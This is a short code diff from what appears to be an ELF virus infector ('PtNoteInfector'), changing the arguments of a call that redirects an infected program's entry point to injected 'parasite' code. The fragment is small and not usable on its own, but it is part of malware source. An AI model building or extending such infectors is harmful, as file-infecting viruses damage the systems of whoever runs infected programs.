@@ -165,7 +165,7 @@ bool PtNoteInfector::inject(std::span<std::byte> host_mapping,
              parasite_mapping.size());
 
   return common::redirect_elf_entry_point(
-      ehdr.e_type, original_e_entry_, parasite_load_address_, virus_offset_,
+      original_e_entry_, parasite_load_address_, virus_offset_,
       parasite_mapping.size(), host_mapping);
 }
 
